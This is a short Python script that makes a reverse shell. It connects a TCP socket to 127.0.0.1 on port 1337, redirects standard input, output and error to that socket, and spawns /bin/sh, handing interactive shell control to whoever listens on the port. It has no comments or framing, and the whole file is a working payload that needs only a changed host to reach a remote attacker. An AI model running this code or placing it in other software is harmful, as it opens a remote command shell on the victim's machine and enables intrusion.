import os, pty, socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 1337))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/sh")
